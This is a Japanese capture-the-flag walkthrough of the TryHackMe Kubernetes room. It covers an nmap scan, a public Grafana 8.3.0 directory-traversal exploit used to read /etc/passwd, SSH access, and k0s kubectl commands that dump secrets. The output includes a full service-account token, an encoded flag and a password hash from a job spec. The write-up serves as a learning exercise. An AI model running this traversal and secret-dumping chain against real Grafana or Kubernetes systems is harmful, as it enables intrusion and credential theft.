# Kubernetes for Everyone CTF

https://tryhackme.com/room/kubernetesforyouly

## Enumeration

```shell
TARGET=10.49.151.243
sudo bash -c "echo $TARGET   k8s >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT     STATE SERVICE      REASON
22/tcp   open  ssh          syn-ack ttl 64
111/tcp  open  rpcbind      syn-ack ttl 64
3000/tcp open  ppp          syn-ack ttl 63
5000/tcp open  upnp         syn-ack ttl 63
6443/tcp open  sun-sr-https syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,111,3000,5000,6443 $TARGET

PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
111/tcp  open  rpcbind           2-4 (RPC #100000)
3000/tcp open  ppp?
5000/tcp open  http              Werkzeug httpd 2.0.2 (Python 3.8.12)
6443/tcp open  ssl/sun-sr-https?
```

SSH, HTTP 他

- 3000: Grafana v8.3.0 (914fcedb72)
- 5000: Etch-a-Sketch (Made by Csaju) /console でPIN入力画面が出る。
- 6443: Kubernetes関係のポートと思われる 

```json
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "Unauthorized",
  "reason": "Unauthorized",
  "code": 401
}
```

## grafana

8.3.0 にディレクトリトラバーサルの脆弱性がある。

```sh
$ searchsploit grafana      

...
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                                                                                                                                              | multiple/webapps/50581.py
...
```

/etc/passwd

```sh
$ python ./50581.py -H http://k8s:3000/
Read file > /etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:[REDACTED]:/home/grafana:/sbin/nologin
```

/etc/os-release

```sh
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.14.3
PRETTY_NAME="Alpine Linux v3.14"
HOME_URL="https://alpinelinux.org/"
BUG_REPORT_URL="https://bugs.alpinelinux.org/"
```

/proc/self/cmdline や /etc/grafana/grafana.ini などを調べたが何も出ない。

行き詰まったのでウォークスルーを見た。

main.css の中に `/* @import url("https://pastebin.com/cPs69B0y"); */` があり、そこで得られる文字列をデコードしたのがユーザー名ということらしい。意味不明。

これと /etc/passwd に含まれていたパスワードを使って SSH接続できた。

## SSH

root同等の権限

```sh
vagrant@johnny:~$ sudo -l
Matching Defaults entries for vagrant on johnny:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vagrant may run the following commands on johnny:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
```

```sh
root@johnny:~/.kube# cat /etc/os-release
NAME="Ubuntu"
VERSION="18.04.3 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.3 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic
```

podではない。ホストか？

```sh
root@johnny:/home/vagrant# env | grep KUBERNETES
root@johnny:/home/vagrant#
```

k0s があった。

```sh
root@johnny:~/.kube# find / -maxdepth 4 -type f \( -name 'k0s*' -o -name 'k3s*' -o -name 'rke*' \) 2>/dev/null
/usr/local/bin/k0s
/etc/systemd/system/k0scontroller.service
```

```sh
root@johnny:~/.kube# k0s kubectl get pods
No resources found in default namespace.

root@johnny:~/.kube# k0s kubectl get nodes
NAME     STATUS     ROLES           AGE      VERSION
johnny   NotReady   control-plane   3y314d   v1.23.3+k0s

root@johnny:~/.kube# k0s kubectl get namespaces
NAME              STATUS   AGE
kube-system       Active   3y314d
kube-public       Active   3y314d
kube-node-lease   Active   3y314d
internship        Active   3y314d
default           Active   3y314d
```

権限。

```sh
root@johnny:~/.kube# k0s kubectl auth can-i --list
Resources                                       Non-Resource URLs   Resource Names        Verbs
*.*                                             []                  []                    [*]
                                                [*]                 []                    [*]
selfsubjectaccessreviews.authorization.k8s.io   []                  []                    [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []                    [create]
                                                [/api/*]            []                    [get]
                                                [/api]              []                    [get]
                                                [/apis/*]           []                    [get]
                                                [/apis]             []                    [get]
                                                [/healthz]          []                    [get]
                                                [/healthz]          []                    [get]
                                                [/livez]            []                    [get]
                                                [/livez]            []                    [get]
                                                [/openapi/*]        []                    [get]
                                                [/openapi]          []                    [get]
                                                [/readyz]           []                    [get]
                                                [/readyz]           []                    [get]
                                                [/version/]         []                    [get]
                                                [/version/]         []                    [get]
                                                [/version]          []                    [get]
                                                [/version]          []                    [get]
podsecuritypolicies.policy                      []                  [00-k0s-privileged]   [use]
```

シークレット

```sh
root@johnny:~/.kube# k0s kubectl get secrets
NAME                  TYPE                                  DATA   AGE
default-token-nhwb5   kubernetes.io/service-account-token   3      3y314d
k8s.authentication    Opaque                                1      3y314d

root@johnny:~/.kube# k0s kubectl describe secrets
Name:         default-token-nhwb5
Namespace:    default
Labels:       <none>
Annotations:  kubernetes.io/service-account.name: default
              kubernetes.io/service-account.uid: 10d42712-bc75-49f8-b236-3d21b0404f8b

Type:  kubernetes.io/service-account-token

Data
====
token:      eyJhbGciOiJSUzI1NiIsImtpZCI6IjloanZwZEh2a1pRTlY1Tk1uSHo3RnJnaEt1alE2a2NCNGowOWtNb0ktSE0ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tbmh3YjUiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjEwZDQyNzEyLWJjNzUtNDlmOC1iMjM2LTNkMjFiMDQwNGY4YiIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.jQg6k-JN6KwQbwClB7HCoGFBxUy4ZV1CYbr15uQ7m6rO0edjCtFAzpumdXPO2qOGK5oBHNlhPRtp6LI6TdUlYZyMsNhfuecZiqAFPvnnQxXDrCg-SJPT6ZBNEAMq6a9IRLx_ppeFSNcjUMGE35bnpCaSF31NlzTzswEDHxk3rqrW-WZkVNhyVyxDa8gulilfwziktUknbbs7zwz3I6vjSwL_9pe1_RkLcRAejarF_jyUwgVlehdBrzZADw158AqLr5I61z0b3O1EX051wvmUKqC2WLuY1K_jqsB3kaa9gUYwDK4WByyCnWpX8SEO4iPl9PBQNQyDagjUfcFLWMSRMw
ca.crt:     1103 bytes
namespace:  7 bytes


Name:         k8s.authentication
Namespace:    default
Labels:       <none>
Annotations:  <none>

Type:  Opaque

Data
====
id:  27 bytes
```

-o yaml を付けるかどうかで出力が異なる。

```sh
root@johnny:~/.kube# k0s kubectl get secrets k8s.authentication
NAME                 TYPE     DATA   AGE
k8s.authentication   Opaque   1      3y314d

root@johnny:~/.kube# k0s kubectl get secrets k8s.authentication -o yaml
apiVersion: v1
data:
  id: VEhNe3llc190aGVyZV8kc19ub18kZWNyZXR9
kind: Secret
metadata:
  creationTimestamp: "2022-02-10T18:58:02Z"
  name: k8s.authentication
  namespace: default
  resourceVersion: "515"
  uid: 416e4783-03a8-4f92-8e91-8cbc491bf727
type: Opaque
```

## 共有ストレージ

```sh
root@johnny:~/.kube# ls /var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/
1   11  13  15  17  19  21  23  25  27  29  30  32  34  36  38  4   41  43  5  7  9
10  12  14  16  18  20  22  24  26  28  3   31  33  35  37  39  40  42  44  6  8
```

```sh
root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots# find . | grep home
./31/fs/home
./31/fs/home/nonroot
./9/fs/home
./40/fs/home
./34/fs/home
./34/fs/usr/lib/x86_64-linux-gnu/security/pam_mkhomedir.so
./34/fs/usr/share/pam-configs/mkhomedir
./34/fs/usr/sbin/mkhomedir_helper
./5/fs/home
./5/fs/usr/share/pam-configs/mkhomedir
./5/fs/lib/x86_64-linux-gnu/security/pam_mkhomedir.so
./5/fs/sbin/mkhomedir_helper
./15/fs/home
./37/fs/home
./37/fs/home/ubuntu
./38/fs/home
./38/fs/home/ubuntu
./38/fs/home/ubuntu/jokes
./38/fs/home/ubuntu/jokes/programming.jokes
./38/fs/home/ubuntu/jokes/crush.jokes
./38/fs/home/ubuntu/jokes/.git
./38/fs/home/ubuntu/jokes/.git/hooks
./38/fs/home/ubuntu/jokes/.git/hooks/pre-merge-commit.sample
./38/fs/home/ubuntu/jokes/.git/hooks/pre-receive.sample
./38/fs/home/ubuntu/jokes/.git/hooks/post-update.sample
./38/fs/home/ubuntu/jokes/.git/hooks/applypatch-msg.sample
./38/fs/home/ubuntu/jokes/.git/hooks/pre-push.sample
./38/fs/home/ubuntu/jokes/.git/hooks/pre-applypatch.sample
./38/fs/home/ubuntu/jokes/.git/hooks/pre-commit.sample
./38/fs/home/ubuntu/jokes/.git/hooks/pre-rebase.sample
./38/fs/home/ubuntu/jokes/.git/hooks/prepare-commit-msg.sample
```

```sh
root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# ls -altotal 28
drwxr-xr-x 3 root root 4096 Feb  7  2022 .
drwxr-xr-x 3 root root 4096 Feb  7  2022 ..
-rw-r--r-- 1 root root 1284 Feb  7  2022 crush.jokes
-rw-r--r-- 1 root root  718 Feb  7  2022 dad.jokes
drwxr-xr-x 8 root root 4096 Feb  7  2022 .git
-rw-r--r-- 1 root root  997 Feb  7  2022 mom.jokes
-rw-r--r-- 1 root root 1160 Feb  7  2022 programming.jokes
```

```sh
root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# git log --name-only --oneline
224b741 (HEAD -> master, origin/master, origin/HEAD) feat: add programming.jokes
programming.jokes
22cd540 feat: add crush.jokes
crush.jokes
king.jokes
4b2c2d7 feat: add cold.joke
king.jokes
2be2045 feat: add mom.jokes
mom.jokes
cc34246 feat: add dad.jokes
dad.jokes
```

```sh
root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# git diff 4b2c2d7
diff --git a/crush.jokes b/crush.jokes

...

index 1b7d703..0000000
--- a/king.jokes
+++ /dev/null
@@ -1 +0,0 @@
-THM{...}
```

```sh
root@johnny:/var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes# k0s kubectl get pods -A
NAMESPACE     NAME                              READY   STATUS      RESTARTS   AGE
internship    internship-job-5drbm              0/1     Completed   0          3y314d
kube-system   kube-router-vsq85                 1/1     Running     0          3y314d
kube-system   metrics-server-74c967d8d4-pvv8l   1/1     Running     0          3y314d
kube-system   kube-api                          1/1     Running     0          3y314d
kube-system   coredns-6d9f49dcbb-9vbff          1/1     Running     0          3y314d
kube-system   kube-proxy-jws4q                  1/1     Running     0          3y314d
```

パスワードハッシュが出てくる。

```sh
k0s kubectl get job -n internship -o json

...
"containers": [
    {
        "command": [
            "echo",
            "[REDACTED]"
        ],
...
```

## 振り返り

- パズル要素が強すぎて好みではなく、ほぼウォークスルーに頼りきり。
- K8Sに関しては多くのことを学べた。
- Webページの一部に Made by Csaju と書かれていたのに、その人がファーストブラッドを獲得していた。こういうのは公平性に疑問が生じるのでやめてほしい。

## Tags

#tags:Kubernetes #tags:Grafana脆弱性 #tags:puzzle
